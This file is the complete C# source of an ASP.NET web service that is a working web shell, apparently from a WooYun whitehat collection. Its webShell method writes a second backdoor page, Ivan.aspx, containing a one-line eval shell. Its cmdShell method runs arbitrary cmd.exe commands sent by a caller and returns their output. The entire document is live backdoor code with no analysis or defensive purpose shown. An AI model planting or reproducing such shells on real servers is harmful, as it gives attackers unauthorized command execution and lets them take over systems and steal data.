<%@ WebService Language="C#" Class="Service" %>
using System;
using System.Web;
using System.IO;
using System.Net;
using System.Text;
using System.Data;
using System.Data.SqlClient;
using System.Collections.Generic;
using System.Diagnostics;
using System.Web.SessionState;
using System.Web.Services;
using System.Xml;
using System.Web.Services.Protocols;

[WebService(Namespace = "http://www.wooyun.org/whitehats/RedFree")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]

public class Service : System.Web.Services.WebService
{
    public Service()
    {

        //ÃˆÃ§Â¹Ã»ÃŠÂ¹Ã“ÃƒÃ‰Ã¨Â¼Ã†ÂµÃ„Ã—Ã©Â¼Ã¾Â£Â¬Ã‡Ã«ÃˆÂ¡ÃÃ»Ã—Â¢ÃŠÃÃ’Ã”ÃÃ‚ÃÃ
        //InitializeComponent(); 
    }


	[System.ComponentModel.ToolboxItem(false)]

	[WebMethod]

/**

Create A BackDoor

**/

	public string webShell()

	{

	StreamWriter wickedly = File.CreateText(HttpContext.Current.Server.MapPath("Ivan.aspx"));

	wickedly.Write("<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"Ivan\"],\"unsafe\");%>");

	wickedly.Flush();

	wickedly.Close();

	return "Wickedly";

	}

	[WebMethod]

/**

Exec Command via cmdShell

**/

	public string cmdShell(string input)

	{

	Process pr = new Process();

	pr.StartInfo.FileName = "cmd.exe";

	pr.StartInfo.RedirectStandardOutput = true;

	pr.StartInfo.UseShellExecute = false;

	pr.StartInfo.Arguments = "/c " + input;

	pr.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;

	pr.Start();

	StreamReader osr = pr.StandardOutput;

	String ocmd = osr.ReadToEnd();

	osr.Close();

	osr.Dispose();

	return ocmd;

	}
}
